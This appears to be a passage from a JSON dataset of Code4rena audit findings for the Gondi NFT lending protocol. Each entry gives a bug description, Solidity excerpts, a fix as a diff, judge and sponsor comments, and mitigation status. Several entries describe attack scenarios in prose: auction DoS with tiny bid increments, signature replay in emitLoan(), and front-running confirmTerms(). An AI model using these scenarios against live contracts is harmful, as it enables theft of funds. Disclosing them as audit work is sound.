bidding is not always less than the principal, it may be more than the principal, and this part should be calculated as `interest`.\n\n### Impact\n\nWhen `received` is greater than the principal, `fees` is not correct.\n\n### Recommended Mitigation\n\n```diff\n    function loanLiquidation(\n        uint256 _loanId,\n        uint256 _principalAmount,\n        uint256 _apr,\n        uint256,\n        uint256 _protocolFee,\n        uint256 _received,\n        uint256 _startTime\n    ) external override onlyAcceptedCallers {\n        uint256 netApr = _netApr(_apr, _protocolFee);\n        uint256 interestEarned = _principalAmount.getInterest(netApr, block.timestamp - _startTime);\n-       uint256 fees = IFeeManager(getFeeManager).processFees(_received, 0);\n+       uint256 fees;\n+       if (_received > _principalAmount) {\n+           fees = IFeeManager(getFeeManager).processFees(_principalAmount, _received - _principalAmount);\n+       }else {\n+           fees = IFeeManager(getFeeManager).processFees(_received, 0);\n+       }\n        getCollectedFees += fees;\n        _loanTermination(msg.sender, _loanId, _principalAmount, netApr, interestEarned, _received - fees);\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/20#event-12545577238)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Corrected calculation of fees as suggested.\n\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/109), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/79) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/32).\n\n***\n\n",
      "summary": "\nThis bug report is about a function called `loanLiquidation()` that calculates interest codes. The issue is that when the amount received from the bidding is more than the principal amount, the fees are not calculated correctly. This can lead to incorrect fees being collected. The recommended mitigation is to update the code to correctly calculate fees when the received amount is greater than the principal amount. The bug has been confirmed and mitigated by the team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/20",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35232",
      "title": "[M-13] `confirmBaseInterestAllocator()` change `BaseInterestAllocator` may pay large `getReallocationBonus`",
      "impact": "MEDIUM",
      "content": "\n`owner` can submit `getPendingBaseInterestAllocator` first, and then anyone can enable it by `confirmBaseInterestAllocator()`.\n\n```solidity\n    function confirmBaseInterestAllocator(address _newBaseInterestAllocator) external {\n        address cachedAllocator = getBaseInterestAllocator;\n        if (cachedAllocator != address(0)) {\n            if (getPendingBaseInterestAllocatorSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n                revert TooSoonError();\n            }\n            if (getPendingBaseInterestAllocator != _newBaseInterestAllocator) {\n                revert InvalidInputError();\n            }\n@>          IBaseInterestAllocator(cachedAllocator).transferAll();\n            asset.approve(cachedAllocator, 0);\n        }\n        asset.approve(_newBaseInterestAllocator, type(uint256).max);\n\n        getBaseInterestAllocator = _newBaseInterestAllocator;\n        getPendingBaseInterestAllocator = address(0);\n        getPendingBaseInterestAllocatorSetTime = type(uint256).max;\n\n        emit BaseInterestAllocatorSet(_newBaseInterestAllocator);\n    }\n```\n\nThe current logic is:\n\n1. Take all the balance of the old `BaseInterestAllocator` and put it in `Pool`.\n2. Change `getBaseInterestAllocator` to the new `BaseInterestAllocator`.\n\nIf the old `BaseInterestAllocator` already has a large balance, the balance of the Pool will increase dramatically. Subsequent users executing `reallocate()` will get a big bonus `getReallocationBonus`.\n\n```solidity\n    function reallocate() external nonReentrant returns (uint256) {\n        (uint256 currentBalance, uint256 targetIdle) = _reallocate();\n        uint256 delta = currentBalance > targetIdle ? currentBalance - targetIdle : targetIdle - currentBalance;\n@>      uint256 shares = delta.mulDivDown(totalSupply * getReallocationBonus, totalAssets() * _BPS);\n\n        _mint(msg.sender, shares);\n\n        emit Reallocated(delta, shares);\n\n        return shares;\n    }\n```\n\nAssuming old `BaseInterestAllocator` balance: 1 M:\n`shares = 1 M * (1 - optimalIdleRange.mid) * totalSupply * getReallocationBonus / totalAssets()`\n\n### Impact\n\nAfter change, `BaseInterestAllocator` may pay large `getReallocationBonus`.\n\n### Recommended Mitigation\n\nExecute `_reallocate()` in the `confirmBaseInterestAllocator()` method without paying any `getReallocationBonus`.\n\n```diff\n    function confirmBaseInterestAllocator(address _newBaseInterestAllocator) external {\n        address cachedAllocator = getBaseInterestAllocator;\n        if (cachedAllocator != address(0)) {\n            if (getPendingBaseInterestAllocatorSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n                revert TooSoonError();\n            }\n            if (getPendingBaseInterestAllocator != _newBaseInterestAllocator) {\n                revert InvalidInputError();\n            }\n            IBaseInterestAllocator(cachedAllocator).transferAll();\n            asset.approve(cachedAllocator, 0);\n        }\n        asset.approve(_newBaseInterestAllocator, type(uint256).max);\n\n        getBaseInterestAllocator = _newBaseInterestAllocator;\n        getPendingBaseInterestAllocator = address(0);\n        getPendingBaseInterestAllocatorSetTime = type(uint256).max;\n+       if (cachedAllocator != address(0)) {\n+             _reallocate();\n+       }\n        emit BaseInterestAllocatorSet(_newBaseInterestAllocator);\n    }\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/22#event-12545571872)**\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/22#issuecomment-2067732464):**\n > Marking as Medium since it'll only take the fee part (which is only a small percentage I guess). I guess also the allocator isn't going to change very often.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Proactively reallocate (we got rid of the bonus though).\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/108) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/31).\n\n***\n\n",
      "summary": "\nThe bug report states that the current logic allows the owner to submit the `getPendingBaseInterestAllocator` first and then anyone can enable it by using `confirmBaseInterestAllocator()`. However, if the old `BaseInterestAllocator` has a large balance, the balance of the pool will increase dramatically and users executing `reallocate()` will receive a big bonus. This can have a significant impact as the `BaseInterestAllocator` may end up paying a large `getReallocationBonus`. To mitigate this issue, it is recommended to execute `_reallocate()` in the `confirmBaseInterestAllocator()` method without paying any `getReallocationBonus`. The severity of this bug has been assessed as Medium and has been mitigated by proactively reallocate. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/22",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35231",
      "title": "[M-12] `Pool.getMinTimeBetweenWithdrawalQueues` current calculations may not be sufficient",
      "impact": "MEDIUM",
      "content": "\n`getMinTimeBetweenWithdrawalQueues` is very important for `Pool`. If `getMinTimeBetweenWithdrawalQueues` is too small, `pendingQueues` will be overwritten too early, and when `Loan` pays off, it won't be able to find the corresponding `queues`.\n\nSo we will calculate `getMinTimeBetweenWithdrawalQueues` by `MaxDuration + _LOAN_BUFFER_TIME` to make sure it won't be overwritten too early.\n\nCurrently: `_LOAN_BUFFER_TIME = 7 days`\nSimilarly: `LiquidationHandler.MAX_AUCTION_DURATION = 7 days`\n\nSo `getMinTimeBetweenWithdrawalQueues` is sufficient if the bidding is done within the time period. However, less consideration is given to the presence of `AuctionLoanLiquidator._MIN_NO_ACTION_MARGIN` and the bidding can be delayed.\n\n```solidity\n    function placeBid(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)\n        external\n        nonReentrant\n        returns (Auction memory)\n    {\n...\n        uint256 currentTime = block.timestamp;\n        uint96 expiration = _auction.startTime + _auction.duration;\n        uint96 withMargin = _auction.lastBidTime + _MIN_NO_ACTION_MARGIN;\n@>      uint96 max = withMargin > expiration ? withMargin : expiration;\n        if (max < currentTime && currentHighestBid > 0) {\n            revert AuctionOverError(max);\n        }\n```\n\nIf the bidding is intense, it may be delayed > `_MIN_NO_ACTION_MARGIN =10 minutes`, or even longer. So `getMinTimeBetweenWithdrawalQueues` may not be enough. Suggest adding an extra day: `MaxDuration + _LOAN_BUFFER_TIME + 3 days`.\n\n### Impact\n\n`getMinTimeBetweenWithdrawalQueues` is not large enough causing `pendingQueues` to be overwritten prematurely.\n\n### Recommended Mitigation\n\n```diff\ncontract Pool is ERC4626, InputChecker, IPool, IPoolWithWithdrawalQueues, LoanManager, ReentrancyGuard {\n...\n\n    /// @dev Used in case loans might have a liquidation, then the extension is upper bounded by maxDuration + liq time.\n-   uint256 private constant _LOAN_BUFFER_TIME = 7 days;\n+   uint256 private constant _LOAN_BUFFER_TIME = 10 days;\n```\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/23#event-12545568687)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Limit auction extensions.\n\n**Status:** Unmitigated. Full details in reports from [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/30), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `getMinTimeBetweenWithdrawalQueues` in the `Pool` contract that is not working properly. If this function has a value that is too small, it can cause other parts of the contract to not function correctly. The report suggests calculating a new value for this function to make sure it is not too small. However, there is another problem that may cause delays in the contract, so the report recommends adding an extra day to the calculation. The impact of this bug is that `pendingQueues` may be overwritten too early, and the recommended mitigation is to limit auction extensions. The bug has not been fixed yet, and more details can be found in the mitigation review section of the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/23",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35230",
      "title": "[M-11] `AuctionLoanLiquidator#placeBid` can be DoS",
      "impact": "MEDIUM",
      "content": "\nThe attacker performs a DoS attack on the `Bid` function, causing other users to be unable to participate and eventually obtaining the NFT at a low price.\n\n### Proof of Concept\n\nThe `placeBid` function requires each bid to increase by 5% from the original, locking in for a period of time after each bid.\n\n```solidity\nfunction placeBid(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)\n        external\n        nonReentrant\n        returns (Auction memory)\n    {\n        _placeBidChecks(_nftAddress, _tokenId, _auction, _bid);\n\n        uint256 currentHighestBid = _auction.highestBid;\n        // MIN_INCREMENT_BPS = 10000, _BPS = 500 , add 5%\n        if (_bid == 0 || (currentHighestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) >= _bid)) {\n            revert MinBidError(_bid);\n        }\n\n        uint256 currentTime = block.timestamp;\n        uint96 expiration = _auction.startTime + _auction.duration;\n@>      uint96 withMargin = _auction.lastBidTime + _MIN_NO_ACTION_MARGIN;\n        uint96 max = withMargin > expiration ? withMargin : expiration;\n        if (max < currentTime && currentHighestBid > 0) {\n            revert AuctionOverError(max);\n        }\n        .....\n    }\n```\n\nThe problem here is that if the initial price increases from a very small value, the second increase in percentage only needs to be a very small amount. For example: 100 wei -> 105 wei -> 110 wei.\n\nSo an attacker can start with a small bid and keep growing slowly. Because of the time lock, other users cannot participate for a period of time. Normal users must wait until the time lock is over and the transaction needs to be executed before the attacker.\n\nIf normal users are unable to participate in the bidding, the attacker can obtain the auction item (NFT) at a very low price.\n\n### Tools Used\n\nVScode\n\n### Recommended Mitigation Steps\n\n```diff\nfunction placeBid(.....){\n+       require (_bid > MIN_BID);\n}\n```\n\n### Assessed type\n\nDoS\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/37#issuecomment-2063819071):**\n > Given that auction duration is 3 days front-running every single tx in that timeframe isn't going to be easy for the attacker. Considering Medium.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/37#issuecomment-2067348640):**\n > We have a check that for an auction to be settled it also requires the last bid to be at least 10' old (to avoid someone sniping at the very end). Given this, someone doing this attack, would actually have to continue going for an indiscriminate amount of time since honest players would be able to bid and extend it.\n> \n> I think this is Low/Medium.\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/37#issuecomment-2067727100):**\n > The attack seems very unlikely, but given that the impact can be quite high, I'm sustaining Medium severity.\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/37#issuecomment-2067773664):**\n > https://github.com/pixeldaogg/florida-contracts/pull/377\n> \n> Starting with a min based on principle to make sure it's meaningful.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> There's a min bid now. This + the min improvement invalidates DoS.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/106) and [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/76).\n\n***\n\n",
      "summary": "\nThe report describes a bug where an attacker can perform a DoS attack on the `Bid` function, preventing other users from participating and allowing the attacker to obtain the NFT at a low price. The `placeBid` function requires each bid to increase by 5% from the original, but an attacker can start with a small bid and slowly increase it, taking advantage of the time lock to prevent others from participating. The bug has been assessed as Medium severity and has been mitigated by adding a minimum bid requirement. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/37",
      "tags": [],
      "finders": [
        "zhaojie",
        "bin2chen"
      ]
    },
    {
      "id": "35229",
      "title": "[M-10] Any liquidators can pretend to be a loan contract to validate offers, due to insufficient validation",
      "impact": "MEDIUM",
      "content": "\nAccepted callers in a loan manager (e.g. `Pool.sol`) can be [either liquidators or loan contracts](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/LoanManager.sol#L73).\n\nAnd only loan contracts should validate offers during a loan creation. However, the current access control check is insufficient in [`pool::validateOffer`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L392), which allows liquidators to pretend to be a loan contract, and [directly modify storage (`__outstandingValues`)](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L414-L415) bypassing additional checks and accounting in a loan contract.\n\n```solidity\n//src/lib/pools/Pool.sol\n    //@audit onlyAcceptedCallers only doesn't ensure caller is a loan contract\n|>    function validateOffer(bytes calldata _offer, uint256 _protocolFee) external override onlyAcceptedCallers {\n        if (!isActive) {\n            revert PoolStatusError();\n        }\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L392>\n\nCurrent access control check ([`onlyAcceptedCallers`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/LoanManager.sol#L58)) only ensures caller is accepted caller but doesn't verify the caller is a loan contract (`_isLoanContract(caller)``==true`).\n\n```solidity\n//src/lib/loans/LoanManager.sol\n    modifier onlyAcceptedCallers() {\n        if (!_acceptedCallers.contains(msg.sender)) {\n            revert CallerNotAccepted();\n        }\n        _;\n    }\n```\n\nWhen a liquidator calls `validateOffer`, they can provide a fabricated `bytes calldata _offer` and `uint256 _protocolFee` bypassing additional checks and state accounting in a loan contract. For example, in MultiSourceLoan.sol- `emitLoan`, [extra checks are implemented](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L124) on `LoanExecutionData` to verify borrower and lender signatures and offer expiration timestamp as well as [transfer collateral NFT tokens](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L153) and [recoding loan to storage](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L155). All of the above can be skipped if a liquidator directly call `validateOffer` and modify `__outstandingValues` without token transfer.\n\n### Recommended Mitigation Steps\n\nIn `Pool::validateOffer`, consider adding a check to ensure `_isLoanContract(msg.sender)``==true`.\n\n### Assessed type\n\nInvalid Validation\n\n**[0xend (Gondi) acknowledged and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/41#issuecomment-2067341452):**\n > This is a low one given these contracts must all live within our ecosystem and be whitelisted. Given there's already that trust assumption, not doing that check to save some gas on an extra state read.\n\n**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/41#issuecomment-2067725596):**\n > > This is a low one given these contracts must all live within our ecosystem and be whitelisted.\n> \n> That makes sense. However, I'm judging this based on the info that was present to the wardens in the README and docs. Given that that trust assumption wasn't noted there I'm going to sustain Medium severity.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Check `loanContract`.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/105), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/75) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/28).\n\n***\n\n",
      "summary": "\nThe bug report is about a flaw in a loan manager program that allows liquidators to pretend to be loan contracts and directly modify storage, bypassing additional checks and accounting in a loan contract. This is due to an insufficient access control check that only ensures the caller is an accepted caller, but does not verify if the caller is a loan contract. This means that liquidators can manipulate the program and skip certain checks and state accounting, potentially causing financial harm. To fix this issue, the report recommends adding a check to ensure the caller is a loan contract. The severity of this bug is considered medium, as the contracts involved are already whitelisted and trusted within the ecosystem. The bug has been mitigated by adding the recommended check. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/41",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35228",
      "title": "[M-09] Inconsistent accounting of `undeployedAssets` might result in undesired optimal range in the pool",
      "impact": "MEDIUM",
      "content": "\n`undeployedAssets` is calculated inconsistently. Currently in `_getUndeployedAssets()` the protocol collected fees are subtracted; however, in `validateOffer`, the protocol collected fees are not subtracted.\n\n1. `_getUndeployedAssets()`: This is called in `deployWithdrawalQueue()` to [calculate proRata liquid assets](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L339) to the `queue.contractAddress`.\n\n```solidity\n    function _getUndeployedAssets() private view returns (uint256) {\n        return asset.balanceOf(address(this)) + IBaseInterestAllocator(getBaseInterestAllocator).getAssetsAllocated()\n|>            - getAvailableToWithdraw - getCollectedFees;\n    }\n```\n\n2. `uint256 undeployedAssets`: This is manually calculated in `validateOffer` flow, which is used check whether the pool has [enough undeployed Assets to cover `loan.principalAmount`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L407).\n\n```solidity\n    function validateOffer(bytes calldata _offer, uint256 _protocolFee) external override onlyAcceptedCallers {\n...\n        uint256 currentBalance = asset.balanceOf(address(this)) - getAvailableToWithdraw;\n        uint256 baseRateBalance = IBaseInterestAllocator(getBaseInterestAllocator).getAssetsAllocated();\n         //@audit getCollectedFees is not subtracted\n|>        uint256 undeployedAssets = currentBalance + baseRateBalance;\n        (uint256 principalAmount, uint256 apr) = IPoolOfferHandler(getUnderwriter).validateOffer(\n            IBaseInterestAllocator(getBaseInterestAllocator).getBaseAprWithUpdate(), _offer\n        );\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L398>\n\nNote that in (2), `undeployedAssets` are inflated because `getCollectedFees` are fees protocol collected from liquidation/repayment flows and shouldn't be considered as liquid assets to cover the loan principal amount.\n\n3. `_reallocate()`: This also manually calculate total `undeployedAssets` amount, but again didn't account for `getCollectedFees`. `_reaalocate()` balances optimal target idle assets ratio by checking `currentBalance`/`total` ratio. Here, `currentBalance` should be additionally subtracted by `getCollectedFees` because fees are set aside and shouldn't be considered idle. This affects [optimal range check](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L581).\n\n```solidity\n    function _reallocate() private returns (uint256, uint256) {\n        /// @dev Balance that is idle and belongs to the pool (not waiting to be claimed)\n        uint256 currentBalance = asset.balanceOf(address(this)) - getAvailableToWithdraw;\n        if (currentBalance == 0) {\n            revert AllocationAlreadyOptimalError();\n        }\n        uint256 baseRateBalance = IBaseInterestAllocator(getBaseInterestAllocator).getAssetsAllocated();\n        uint256 total = currentBalance + baseRateBalance;\n        uint256 fraction = currentBalance.mulDivDown(PRINCIPAL_PRECISION, total);\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/pools/Pool.sol#L572>\n\nInconsistent accounting in various flows may result in incorrect checks or undesirable optimal ranges.\n\n### Recommended Mitigation Steps\n\nAccount for `getCollectedFees` in (2) and (3), noted above.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/44#event-12543633373)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Missing collected fees in accounting.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/104) and [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/74).\n\n***\n\n",
      "summary": "\nThe bug report states that the `undeployedAssets` are calculated inconsistently in the Gondi protocol. In `_getUndeployedAssets()`, the protocol collected fees are subtracted, but in `validateOffer`, the protocol collected fees are not subtracted. This causes an inflation of the `undeployedAssets` in the protocol. Additionally, in `_reallocate()`, the collected fees are not accounted for, which affects the optimal range check. This inconsistency in accounting can lead to incorrect checks and undesirable optimal ranges. The recommended mitigation steps include accounting for the collected fees in both `validateOffer` and `_reallocate()`. The bug has been confirmed and mitigated by the Gondi team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/44",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35227",
      "title": "[M-08] Borrower signature could be reused in `emitLoan()`",
      "impact": "MEDIUM",
      "content": "\nThe function `emitLoan()` is used to issue a new loan. This function could be called directly by the borrower or by a random address if the borrower has signed the `LoanExecutionData`.\n\n```solidity\nfunction emitLoan(LoanExecutionData calldata _loanExecutionData)\n    external\n    nonReentrant\n    returns (uint256, Loan memory)\n{\n    address borrower = _loanExecutionData.borrower;\n    ExecutionData calldata executionData = _loanExecutionData.executionData;\n    (address principalAddress, address nftCollateralAddress) = _getAddressesFromExecutionData(executionData);\n\n    OfferExecution[] calldata offerExecution = executionData.offerExecution;\n\n    // @audit Check borrower signature or borrower is caller\n    _validateExecutionData(_loanExecutionData, borrower); \n    ...\n}\n\nfunction _validateExecutionData(LoanExecutionData calldata _executionData, address _borrower) private view {\n    if (msg.sender != _borrower) {\n        _checkSignature(\n            _executionData.borrower, _executionData.executionData.hash(), _executionData.borrowerOfferSignature\n        );\n    }\n    if (block.timestamp > _executionData.executionData.expirationTime) {\n        revert ExpiredOfferError(_executionData.executionData.expirationTime);\n    }\n}\n```\n\nHowever, there isn't a check to ensure the signature for the same `LoanExecutionData` can't be used to execute `emitLoan()` more than once. As a result, if the borrower repays the loan, an attacker could call `emitLoan()` again to initiate a new loan.\n\n### Proof of Concept\n\nConsider this scenario:\n\n1. Lender Alice has an offer with a capacity of 50 ETH.\n2. Borrower Bob signs a signature to take a 10 ETH loan with his NFT.\n3. After Bob repays the loan, anyone can call `emitLoan()` using the previous signature to force Bob to take the 10 ETH loan again. Since the capacity of Alice's offer is 50 ETH, the signature can be reused up to 5 times.\n\n### Recommended Mitigation Steps\n\nAdd a nonce to ensure a signature cannot be reused.\n\n**[0xend (Gondi) acknowledged and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/51#issuecomment-2067101203):**\n > This could be the case but don't think is high given the struct has an expiration time to contemplate this. Borrower can avoid any issue by setting this to be close to the execution. Loans lasts for months, this will be at most a few hours.\n >\n> To avoid an extra write+read, I'd probably make it very clear to the consumer of the smart contract.\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/51#issuecomment-2067672355):**\n > Marking as Medium due to sponsor comment. This requires some external conditions which don't seem to be easily satisfied.\n\n**[0xend (Gondi) commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/51#issuecomment-2067751372):**\n> For the replay to happens:\n> - Borrower needs to set an expiration longer than the intended time in which they'll repay the loan.\n> - All lender offers must not expire before the loan is repaid AND have capacity.\n> \n> Borrower has no reason to set this variable longer than `block.timestamp + small delta` (the time it remains in the mempool).\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Borrower should always set `block.timestamp` + small time delta as expiration to control when the loan can be started.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/103) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/26).\n\n***\n\n",
      "summary": "\nThe function `emitLoan()` in this code allows for a new loan to be issued. However, there is a bug where the same signature can be used to initiate multiple loans, even after the original loan has been repaid. This means that an attacker could use this bug to force a borrower to take out the same loan multiple times. The recommended mitigation is to add a nonce to prevent this from happening. The severity of this bug has been decreased to medium due to certain conditions that need to be met for the bug to be exploited. The bug has been confirmed to be mitigated by the sponsor and further details can be found in the mitigation reports.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/51",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "35226",
      "title": "[M-07] Attacker can front-run and pass in empty terms, making it impossible to `confirmTerms()`",
      "impact": "MEDIUM",
      "content": "\nIn `PoolOfferHandler`, setting new terms requires two steps (`setTerms()` and `confirmTerms()`). The `setTerm()` function is `onlyOwner`, but anyone can call the `confirmTerms()` function. At the end of the `confirmTerms()` function, `pendingTermsSetTime` is set to `type(uint256).max`, preventing the function from being called again.\n\nSince `confirmTerms()` uses the caller's input to execute the setup, an attacker could input empty `__terms` to prevent the owner from setting up new terms.\n\n### Proof of Concept\n\n```solidity\n// @audit Anyone can front-run and pass in empty terms, making it impossible to confirmTerms\nfunction confirmTerms(TermsKey[] calldata _termKeys, Terms[] calldata __terms) external { \n    if (block.timestamp - pendingTermsSetTime < NEW_TERMS_WAITING_TIME) {\n        revert TooSoonError();\n    }\n    for (uint256 i = 0; i < __terms.length; i++) {\n        if (_termKeys[i].duration > getMaxDuration) {\n            revert InvalidDurationError();\n        }\n        uint256 pendingAprPremium = _pendingTerms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i]\n            .maxSeniorRepayment][__terms[i].principalAmount];\n        if (pendingAprPremium != __terms[i].aprPremium) {\n            revert InvalidTermsError();\n        }\n        _terms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i].maxSeniorRepayment][__terms[i]\n            .principalAmount] = __terms[i].aprPremium;\n        delete _pendingTerms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i]\n            .maxSeniorRepayment][__terms[i].principalAmount];\n    }\n    pendingTermsSetTime = type(uint256).max;\n\n    emit TermsSet(_termKeys, __terms);\n}\n```\n\nIn this function, it loops through the input `__terms.length` list. If an attacker calls `confirmTerms()` with an empty `__terms` list, there will be no terms set, and `pendingTermsSetTime` is still set to `type(uint256).max`.\n\nAs a result, the owner will never be able to set up new terms for the pool because the attacker keeps spamming `confirmTerms()` when the `NEW_TERMS_WAITING_TIME` passes after the owner calls `setTerms()`.\n\n### Recommended Mitigation Steps\n\nRecord the `__terms` list in the `setTerms()` function to confirm terms instead of using input from caller.\n\n### Assessed type\n\nDoS\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/58#event-12545396903)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Terms must be passed in the confirm as well.\n\n**Status:** Mitigation confirmed. Full details in reports from 